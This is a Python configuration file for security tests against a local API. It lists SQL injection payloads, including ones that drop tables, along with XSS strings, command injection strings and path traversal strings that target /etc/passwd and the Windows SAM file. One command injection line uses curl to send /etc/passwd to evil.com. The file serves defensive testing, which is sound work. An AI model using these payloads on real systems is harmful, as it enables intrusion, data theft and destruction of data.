"""
Configuration for security tests
"""

# Test configuration
TEST_CONFIG = {
    "base_url": "http://localhost:3000/api/v1",
    "jwt_secret": "test-security-secret",
    "timeout": 10,
}

# Security test payloads
SQL_INJECTION_PAYLOADS = [
    "1' OR '1'='1",
    "1'; DROP TABLE facilities;--",
    "1' UNION SELECT * FROM users--",
    "1' AND 1=1--",
    "1' AND '1'='1' /*",
    "admin'--",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "1; EXEC sp_MSForEachTable 'DROP TABLE ?'",
    "1' WAITFOR DELAY '0:0:5'--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
    "'-alert('XSS')-'",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "`whoami`",
    "$(whoami)",
    "; curl http://evil.com/?data=`cat /etc/passwd`",
    "& dir",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
